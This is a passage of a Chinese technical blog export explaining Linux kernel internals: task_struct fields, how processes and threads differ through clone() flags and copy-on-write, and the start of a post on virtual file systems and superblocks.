stack。用户态进程所使用的栈，是在进程虚拟内存线性地址空间中；而内核栈是当进程从用户空间进入内核空间时，特权级发生变化，需要切换堆栈，那么内核空间中使用的就是这个内核栈。因为内核很少的栈空间，所以通常只需分配两页（8192字节）的空间。</p><p>下图中左边是一个thread_union结构体，它包含两部分，一部分是内核栈stack，第二部分是一个thread_info结构体。而在thread_info结构体里有一个指针指向该进程的task_struct结构体，反过来，task_struct里同样有一个指针<code>void *stack</code>指向这个thread_union结构体（也可以说指向该stack起始地址）。</p><p><img src="https://s2.loli.net/2023/08/17/u6EMeH4BGkJAaQr.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// thread_union 结构体</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="type">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// thread_info结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcb_struct</span><span class="title">pcb</span>;</span><span class="comment">/* palcode state */</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">task</span>;</span><span class="comment">/* main task structure */</span>  </span><br><span class="line">    <span class="comment">/*这里很重要，task指针指向的是所创建的进程的struct task_struct */</span></span><br><span class="line">    </span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>flags;<span class="comment">/* low level flags */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>ieee_state;<span class="comment">/* see fpu.h */</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>*<span class="title">exec_domain</span>;</span><span class="comment">/* execution domain */</span>  <span class="comment">/*表了当前进程是属于哪一种规范的可执行程序,</span></span><br><span class="line"><span class="comment">                                         不同的系统产生的可执行文件的差异存放在变量exec_domain中 */</span></span><br><span class="line"><span class="type">mm_segment_t</span>addr_limit;<span class="comment">/* thread address space */</span></span><br><span class="line"><span class="type">unsigned</span>cpu;<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="type">int</span>preempt_count; <span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; BUG */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> bpt_nsaved;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> bpt_addr[<span class="number">2</span>];<span class="comment">/* breakpoint handling  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bpt_insn[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span><span class="title">restart_block</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么thread_info到底有什么用呢？其实这个结构体保存了task_struct中需要频繁和快速访问的字段，内核态在运行时可以迅速查到这些重要字段。此外，task_struct保存的是所有体系架构中通用的进程描述信息，而thread_info里却保存了特定体系结构汇编代码段需要访问的那部分进程的数据，因此，x86，arm等不同体系结构的thread_info并不完全相同。</p><h4 id="5）三个非常重要的结构体"><a href="#5）三个非常重要的结构体" class="headerlink" title="5）三个非常重要的结构体"></a><strong>5）三个非常重要的结构体</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>, *<span class="title">active_mm</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span> </span><br></pre></td></tr></table></figure><p>这几个结构体相当重要，mm_struct用于描述进程的虚拟内存，files_struct描述进程打开的文件，fs_struct描述进程当前所在路径，这些结构体在我之前的几篇文章里有很详细的讲解，不了解的话可以去看看，这里呢就不再重复写了。</p><h4 id="6）调度信息"><a href="#6）调度信息" class="headerlink" title="6）调度信息"></a><strong>6）调度信息</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> prio, static_prio, normal_prio;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> rt_priority;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> <span class="title">se</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span> <span class="title">rt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> policy;</span><br></pre></td></tr></table></figure><p>实时优先级范围是0到MAX_RT_PRIO-1（即99），而普通进程的静态优先级范围是从MAX_RT_PRIO到MAX_PRIO-1（即100到139），值越大静态优先级越低。</p><p>static_prio用于保存静态优先级，可以通过nice系统调用来进行修改。prio用于保存动态优先级。rt_priority用于保存实时优先级。normal_prio 的值取决于静态优先级和调度策略(进程的调度策略有：先来先服务，短作业优先、时间片轮转、高响应比优先等等的调度算法)。</p><p>policy表示进程的调度策略。</p><h4 id="7）运行统计"><a href="#7）运行统计" class="headerlink" title="7）运行统计"></a><strong>7）运行统计</strong></h4><p>运行统计从宏观来说也是一种状态变量，但是和任务状态不同，其存储的主要是运行时间相关的成员变量，具体如下所示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">u64        utime;<span class="comment">//用户态消耗的CPU时间</span></span><br><span class="line">u64        stime;<span class="comment">//内核态消耗的CPU时间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>      nvcsw;<span class="comment">//自愿(voluntary)上下文切换计数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>      nivcsw;<span class="comment">//非自愿(involuntary)上下文切换计数</span></span><br><span class="line">u64        start_time;<span class="comment">//进程启动时间，不包含睡眠时间</span></span><br><span class="line">u64        real_start_time;<span class="comment">//进程启动时间，包含睡眠时间</span></span><br></pre></td></tr></table></figure><h4 id="8）进程信号信息"><a href="#8）进程信号信息" class="headerlink" title="8）进程信号信息"></a><strong>8）进程信号信息</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span><span class="comment">//指向进程信号描述符</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span><span class="comment">//指向进程信号处理程序描述符</span></span><br><span class="line"><span class="type">sigset_t</span> blocked, real_blocked;<span class="comment">//阻塞信号的掩码</span></span><br><span class="line"><span class="type">sigset_t</span> saved_sigmask;    <span class="comment">/* restored if set_restore_sigmask() was used */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> <span class="title">pending</span>;</span><span class="comment">//进程上还需要处理的信号</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sas_ss_sp;<span class="comment">//信号处理程序备用堆栈的地址</span></span><br><span class="line"><span class="type">size_t</span> sas_ss_size;<span class="comment">//信号处理程序的堆栈的地址</span></span><br></pre></td></tr></table></figure><h4 id="9）进程权限"><a href="#9）进程权限" class="headerlink" title="9）进程权限"></a><strong>9）进程权限</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span><span class="comment">//指向进程信号描述符</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span><span class="comment">//指向进程信号处理程序描述符</span></span><br><span class="line"><span class="type">sigset_t</span> blocked, real_blocked;<span class="comment">//阻塞信号的掩码</span></span><br><span class="line"><span class="type">sigset_t</span> saved_sigmask;    <span class="comment">/* restored if set_restore_sigmask() was used */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> <span class="title">pending</span>;</span><span class="comment">//进程上还需要处理的信号</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sas_ss_sp;<span class="comment">//信号处理程序备用堆栈的地址</span></span><br><span class="line"><span class="type">size_t</span> sas_ss_size;<span class="comment">//信号处理程序的堆栈的地址</span></span><br></pre></td></tr></table></figure><p>以上就是一个task_struct结构体最常见的一些字段了，最重要的几个其实就是任务ID，亲缘关系，任务状态，内存管理以及文件系统管理，下面这幅图很好地总结了它的基本结构。</p><p><img src="https://s2.loli.net/2023/08/17/B8uMgLCsJV6oITY.png" alt="image.png"></p><h2 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h2><p>这是一个很经典的问题，同时也是面试操作系统中最最常被问到的问题，这部分包含了一些我自己的理解，如有不完善的地方欢迎和我一起聊聊。首先，我们先来看看面经是如何回答的：</p><blockquote><ol><li>进程是资源分配的基本单位，线程是程序执行和资源调度的基本单位。</li><li>进程有自己的独立地址空间，每启动一个进程，系统就会为它分配地址空间，建立数据表来维护代码段、堆栈段和数据段，这种操作非常昂贵。而线程是共享进程中的数据段，因此CPU切换一个线程的花费远比进程要小很多，同时创建一个线程的开销也比进程要小很多。</li><li>线程之间的通信更方便，同一进程下的线程共享全局变量、静态变量等数据，而进程之间的通信需要以通信的方式（IPC)进行。</li><li>多进程程序更健壮，多线程程序只要有一个线程死掉，整个进程也死掉了，而一个进程死掉并不会对另外一个进程造成影响。</li></ol></blockquote><p>通过前文我们了解到，从内核数据结构来看，一个PCB，即一个task_struct，也就是cpu调度的一个最基本单位。<strong>所以在Linux中我们通常所认为的进程和线程，在操作系统底层并没有什么区别，它们都是由task_struct结构体去表示的。</strong>当我们谈论到进程和线程的区别的时候，首先需要想到这幅图，也就是进程的虚拟地址空间：<img src="https://s2.loli.net/2023/08/17/Rue9f8s3CaXwpY4.png" alt="image.png"></p><p>简单起见，我们可以这样理解：我们把这样一整个虚拟地址空间看作一个集装箱，箱子里有各个模块（用户栈，数据段，代码段，堆等等），那么一个箱子就代表一个进程。如果新创建一个进程，就相当于新创建了一个箱子；而如果新建一个线程，仅仅是相当于在原来这个箱子里面的用户栈区域那里新创建了一个线程栈，新线程和原线程共享箱子里的mmap区，数据段，代码段等等资源，而独享自己的线程栈。那么结合前面的知识就可以很容易发现，一个task_struct<strong>并不是</strong>代表一个进程，而是代表一个线程。换句话说，<strong>一个进程包含多个线程，也就可以类比为：一个箱子里可能有多个task_struct，只不过同一个箱子里的多个task_struct共享数据段，mmap等资源，而独享自己的线程栈资源。也可以认为：线程栈的数量等于task_struct的个数。</strong>而如果是单线程程序，那么就只有一个线程栈，也就只有一个task_struct。</p><blockquote><p>一个线程栈其实是很小的，32位系统下，一整个进程虚拟空间有4GB大小，1GB的内核空间和3GB的用户空间，而通常默认一个线程栈只有8MB。也因此在不手动修改默认线程栈大小的情况下，32位Linux系统下通常一个进程最多也就可以创建300个左右的线程。</p></blockquote><p>从源码的角度看（参考Linux2.6），创建一个进程的函数是fork()，创建一个线程的函数是pthread_create()，值得注意的是，这两个函数底层都会调用同一个系统调用 clone()，而clone()函数正是会创建一个task_struct结构体，我们来看一看clone()函数的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">clone</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *child_stack, <span class="type">int</span> flags, <span class="type">void</span> *arg)</span>;   </span><br></pre></td></tr></table></figure><p>其中我们需要尤其重点关注flags参数，flags是要复制资源的标志，描述你需要从父进程继承哪些资源，在这里设置参数：</p><table><thead><tr><th>Flags字段</th><th>解释</th></tr></thead><tbody><tr><td>CLONE_VM</td><td>子进程与父进程运行于相同的内存空间</td></tr><tr><td>CLONE_FS</td><td>子进程与父进程共享相同的文件系统，包括root、当前目录、umask</td></tr><tr><td>CLONE_FILES</td><td>子进程与父进程共享相同的文件描述符（file descriptor）表</td></tr><tr><td>CLONE_SIGHAND</td><td>子进程与父进程共享相同的信号处理（signal handler）表</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>很简单的道理，创建新进程的fork()和创建新线程pthread_create()通过给clone()函数传递不同的参数值，决定了新建的那个task_struct究竟是新建一整个箱子，还是在原来的箱子里仅仅新建一个线程栈。</p><p>比如，对于fork()调用clone()，新建一个进程，也就意味着它新建的所有资源都应该自己独有，Linux的设计实际上是在创建task_struct时会拷贝父进程的资源。例如，一旦fork()出了一个新进程，那么相当于新进程会申请一些物理页，并填充其task_struct里对应的mm_struct，fs_struct，file_struct，signal等等字段，这些字段初始化时都会拷贝父进程的。</p><blockquote><p>当然，在这里有一个很重要的技术叫做<strong>写时复制（COW，copy on write）</strong>，也就是说 ，新建的进程虽然逻辑上是新建了一个箱子，自己独享自己的资源，但是刚创建时，这些资源在物理页实际上还是指向父进程的（其实就是浅拷贝），而一旦父进程或子进程在后续运行过程中有修改该字段，才会触发写时复制机制，系统才会给子进程新申请一块物理内存，此时子进程才真正意义上在该字段与父进程完全隔离。这个技术很大程度上避免了一些只读的数据重复拷贝造成时间和空间上的浪费。</p></blockquote><p>而pthread_create()调用clone()新建的子线程，则不会有自己独享的mm_struct，fs_struct，file_struct，signal等结构，例如子线程在修改file_struct时并不会触发写时拷贝给自己申请新物理页，而是与主线程共享这个字段，大家都能修改它，这也体现了它们处于同一个箱子里，共享这些资源的特征。</p><p>❓ 讲到这里大家可能会有一个神奇的想法：既然fork()调用clone()是mm_struct，fs_struct，file_struct，signal等字段都新创建并独自享有，pthread_create()调用clone()是mm_struct，fs_struct，file_struct，signal等字段都共享父线程。那么我可不可以自己直接调用clone()函数，通过传参设定mm_struct，fs_struct独自享有，file_struct，signal共享呢，那我这样创建出来的这个task_struct算是线程还是进程呢？</p><p>🤣 实际上这种想法很有意思，如果能够这样想或许你大概就真正理解进程和线程的区别了，借Linux大师宋宝华老师的一句话：这样，你就创建出了一个人妖。它既不是一个新进程，又不是一个新线程，它是一个人妖。因此其实我们也可以看到Linux确实是很灵活的。无论如何，Linux调度器才不管你是进程还是线程，还是人妖，反正它调度只认task_struct结构体。</p><hr><p>讲到这里，就有一个非常非常重要的结论了，我认为：线程是一个具体的概念，一个线程对应一个线程栈，也对应一个task_struct，一个进程可以包含一个或者多个线程。而进程实际上是一个抽象的概念，比如如果一个程序包含5个线程，那么这5个task_struct以及它们的资源组成的这么一个箱子的整体，那就是一个进程，<strong>而进程本身在Linux系统里并没有具体的结构体去描述它</strong>，因此我认为<strong>进程实际上就是一系列pid相同的线程的集合</strong>。换句话说，<strong>线程是一个物理上的具象（因为它由task_struct所描述），而进程是一个逻辑上的集合。</strong></p><blockquote><p><strong>进程实际上就是一系列tgid相同的线程的集合。</strong></p></blockquote><p>此外，我们时常有听到主线程和子线程的概念，其实讲到这里我们就明白，从task_struct的角度看，所谓的主线程和子线程其实并没有任何主次之分，因为无论是在资源享有，线程调度等各个方面，所谓的主线程也都并没有比子线程 “高人一等”。可能唯一的一点特殊性就在于：所谓的主线程的pid等于整个进程的tgid吧（PS：这一点我其实不确定，待考究）。<strong>因此从内核这个意义上来看，我们可以抛弃主线程子线程这一概念，因为所有的线程都是平等的。</strong></p><p>那么有同学可能会有疑问，在下面这个例子里，为什么main退出之后其他子线程也会退出，而某一子线程运行结束之后其他子线程以及main主线程不会退出呢，这难道不是意味着main主线程比三个子线程更牛吗？<img src="https://s2.loli.net/2023/08/17/tApyiRqgTONhM6S.png" alt="image.png"></p><p>实际上关键问题出在<code>return</code>这个语句上。我们都知道一个进程包含的所有线程是共享堆，mmap，数据段等资源的，因此一旦某一个线程出了问题，为安全起见，Linux会杀掉该线程所在的进程包含的所有子线程。</p><blockquote><p>当然严格来说，线程崩溃其实是触发了SIGSEGV (Segmentation Violation&#x2F;Fault)信号。如果没有手动设置对应的Signal Handler操作那么系统就会自动终止整个进程（或者说默认的Signal Handler就是终止整个进程）；如果有手动设置，也可以恢复进程状态继续跑。</p></blockquote><p>此外，Linux还提供一个系统调用：exit()，它的作用是<strong>关闭所有文件，终止正在执行的进程。</strong>请注意，是终止正在执行的进程而不仅仅是终止该线程本身。在上图中，子线程里return实际上会返回到它的主调函数，也就是main函数里，因此这里创建的几个子线程在结束后并没有唤起终止整个进程。但是main里的<code>return 0;</code>实际上是直接返回操作系统并调用exit()系统调用，进而终止整个进程！这也就是为什么会出现 “main退出之后其他子线程也会退出，而某一子线程运行结束之后其他子线程以及main主线程不会退出” 这样的现象。</p><p>其实我们可以做这样一个实验：在main最后加一个<code>while(1);</code> 死循环让其不要退出，而在子线程里直接调用exit()系统调用，我们会发现：一旦子线程调用了exit()，包括main线程在内的所有线程依然会全部退出！这也进一步证明了：Linux里可以认为没有所谓的主线程和子线程之分，大家人人平等！</p><p>最后，我还想总结一句话，进程和线程，这两个概念，到底什么时候能够做区分呢？如果单独把一个task_struct拿出来问：它是一个进程还是一个线程？显然，我们是无法回答的。因此，实际上只有在clone()函数创建出一个新task_struct的那一瞬间，我们可以说：<strong>相比于父task_struct，我们新建了一个进程还是新建了一个线程</strong>，如果去掉参考系，去判断单独的一个task_struct是进程还是线程，可能并没有太大意义。</p><p>题外话，上述我们谈的都是内核级的线程，除此之外还有一种用户级线程，那是从应用层去自己实现了不同函数及调度等等操作，而在内核层面也只有一个task_struct，这我们就不过多阐述了。</p><p>到这里再来回看面经里的第一句话：<strong>进程是资源分配的基本单位，线程是资源调度的基本单位。</strong>我认为这句话总结的其实相当完美，它很好地概括了进程和线程的区别。最后，再提一下本篇文章的总结，那就是：</p><blockquote><p><strong>线程是一个物理上的具象（task_struct），进程是一个逻辑上的集合（资源封装的箱子）。</strong></p></blockquote><hr><p>以上就是对进程和线程的一些理解了，稍后我们将跟踪fork()和pthread_create()的源码，以及进入到clone()里，去进一步了解一下task_struct究竟是如何被创建的，这将更加有利于我们加深对其的理解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件系统技术内幕</title>
      <link href="/2023/01/16/04Linux_fileSystem/"/>
      <url>/2023/01/16/04Linux_fileSystem/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 学习 Linux 分析与应用的过程中可以自己尝试去实现一个文件系统，这个在我们的下一章节中进行代码操作。在这一章节我们一起来看看 Linux 文件系统中涉及到的各种结构体基础知识，为后面进一步手动操作做好铺垫。这部分内容在当初学操作系统时学校其实是讲的比较浅的，再加上各个结构体之间错杂交互，下面我们就来一起再探讨一下吧！参考书籍：Linux 内核设计与实现；深入理解 Linux 内核。</p></blockquote><h1 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h1><p>​一切皆文件是 Linux 的基本哲学之一，无论是普通文件还是目录，设备，套接字等都统一抽象成文件描述，并提供相同的 api 对其进行操作，正因此，Linux 中允许不同的文件系统共存，如 ext2，ext3，xfs等，而作为用户却无需关心底层文件类型，只需要使用统一的 api 便可进行各种文件操作，这就是 Linux 的虚拟文件系统（VFS，Virtual Filesystem Switch）。VFS 向上提供统一的文件操作接口（例如 open() 函数），而向下各个文件系统内部对其调用有各自的实现。什么是文件系统呢？其定义为操作系统中的各类文件，管理文件的软件，以及管理文件所涉及到的数据结构等信息的集合，他们都可挂载在 Linux 文件树下，即一个文件系统的顶层目录（&#x2F;）可挂载在另一个文件系统的子目录下，使之成为其树形结构的一个分支，而该子目录便称为挂载点。</p><p><img src="https://s2.loli.net/2023/01/16/6gsIBJFflynKU2c.jpg" alt="WAS42F8324_4_B_HGGDRADR.jpg"></p><p>​Linux 下有几十种文件类型，如下。</p><ul><li>ext2 具有极快的速度和极小的CPU占用率，可用于硬盘和移动存储设备，兼容 FAT，安全性不高。</li><li>ext3 增加日志功能，可回溯追踪，稳定性高。</li><li>ext4 日志式文件系统，支持1EB，最大单文件16TB，支持连续写入可减少文件碎片。</li><li>xfs 可以管理500T的硬盘。rhel7 默认文件系统。</li></ul><p>​windows 的文件系统有比如 FAT16，FAT32，NTFS等等，还有其他文件系统比如 RAMFS：内存文件系统；ISO 9660：光盘；NFS：网络文件系统等。比如我们 Linux 的<code>/proc</code>目录就是一种 procfs虚拟文件系统，其挂载于 Linux 根目录下。接下来我们就来看看构成文件系统的数据结构，也就是文件系统在磁盘中的表现形式。</p><h1 id="文件在磁盘中的组织形式"><a href="#文件在磁盘中的组织形式" class="headerlink" title="文件在磁盘中的组织形式"></a>文件在磁盘中的组织形式</h1><p>​磁盘是由若干扇区组成，每个扇区有512B (将磁盘存储区扇区化是为了更好的管理磁盘)。若干个扇区可组成一个块 (ext2 默认是由8个扇区组成一个块，即 4kb ，这里为了简化说明，就把2个扇区组成一个块，即 1kb)。而若干个块便组成了磁盘的一个分区。</p><p>​文件系统的物理表现形式主要由四个部分组成。<strong>超级块，索引节点，目录块，数据块</strong>。除此之外还有每个分区开头的<strong>自举块</strong>（主要存储分区本身的操作系统类型、分区起始地址，与文件系统无关，每个分区只有一个），位于 i节点表 和 超级块 之间的（下图没画出来）的**块组描述表 GDT <strong>（存储一个块组的描述配置信息），</strong>块位图(block bitmap)<strong>（每个比特位表示一个数据块是否被标记使用；1：已使用，0：未使用；）以及</strong>inode 位图(inode bitmap)**（每一个比特位表示一个inode节点。1：已使用，0：未使用；）。</p><p><img src="https://s2.loli.net/2023/01/16/1Wr3GIyiVBNQ2H9.png" alt="image.png"></p><h2 id="超级块-super-block"><a href="#超级块-super-block" class="headerlink" title="超级块(super block)"></a>超级块(super block)</h2><p>​⽤于存储⽂件系统的全局控制信息的数据结构，是文件系统的心脏，一个超级块对应一个独立的文件系统。描述⽂件系统的状态、⽂件系统类型、大小 、区块数、索引节点数等，存放于磁盘的特定扇区中。当操作系统启动后，系统内核会把超级块中的内容复制到内存中，并周期性的利用内存里的最新内容去更新硬盘上的超级块中的内容（超级块对象维护着整个文件系统的元数据，因此在开机后是常驻内存并被缓存的）。而对于某些非基于磁盘的文件系统（例如基于内存的文件系统，sysfs），它们会在使用现场创建超级块并保存于内存之中。</p><p>​由于这个更新存在时间差，为此内存中的超级块信息与硬盘中的超级块信息往往只有在开机与关机的某个特定时刻是同步的，而在其他时间都是不同步的。假设当操作系统意外宕机或者断电时，内存中的超级块信息没有及时保存到硬盘中，此时文件系统的完整性就会受到破坏。到这种情况时，系统工程师往往需要利用系统提供的 sync 命令在系统出现故障的那一刻把内存里的内容复制到磁盘上。这个过程往往操作系统会自动完成，这也正是因为为什么Unix操作系统要比Windows操作系统稳定的一个重要原因。当操作系统重新启动的过程中，系统内核会对两者进行比较，根据他们之间的差异，给文件系统打上干净或者脏的标签，该信息也是存储在文件系统的超级块中。</p><p>​通过<code>df -i</code>命令可以查看目前在 Linux 系统上的文件系统磁盘使用情况（inode，后面有介绍）统计。接着使用<code>sudo dumpe2fs /xxxx</code>可以查看该文件系统的超级块和块组信息。</p><p>​超级块对象由 super_block 结构体表示，定义于 <code>linux/fs.h</code>中，如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_list</span>;</span></span><br><span class="line"><span class="type">dev_t</span>s_dev;<span class="comment">/*设备标识符 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>s_blocksize;<span class="comment">/*以字节为单位的块大小*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>s_blocksize_bits;<span class="comment">/*块大小占用位数，如512字节的位数为9*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>s_dirt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>s_maxbytes;<span class="comment">/* Max file size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>*<span class="title">s_type</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>*<span class="title">s_op</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dquot_operations</span>*<span class="title">dq_op</span>;</span><span class="comment">/*文件系统的配额操作函数集合*/</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">quotactl_ops</span>*<span class="title">s_qcop</span>;</span><span class="comment">/*文件系统的配额控制操作函数集合*/</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">export_operations</span> *<span class="title">s_export_op</span>;</span><span class="comment">/*网络文件系统的导出操作函数集合*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>s_flags;<span class="comment">/*挂载标志*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>s_magic;<span class="comment">/*魔术数标记*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>*<span class="title">s_root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span><span class="title">s_umount</span>;</span><span class="comment">/*文件系统卸载时候用到的读写信号量*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">s_lock</span>;</span><span class="comment">/*专用的互斥量*/</span></span><br><span class="line"><span class="type">int</span>s_count; <span class="comment">/*引用计数*/</span></span><br><span class="line"><span class="type">int</span>s_syncing;<span class="comment">/*文件系统的同步标记位*/</span></span><br><span class="line"><span class="type">int</span>s_need_sync_fs;<span class="comment">/*需要同步的标记位*/</span></span><br><span class="line"><span class="type">atomic_t</span>s_active;<span class="comment">/*原子文件系统引用计数*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>                    *s_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xattr_handler</span>**<span class="title">s_xattr</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_inodes</span>;</span><span class="comment">/* all inodes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_dirty</span>;</span><span class="comment">/* dirty inodes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span 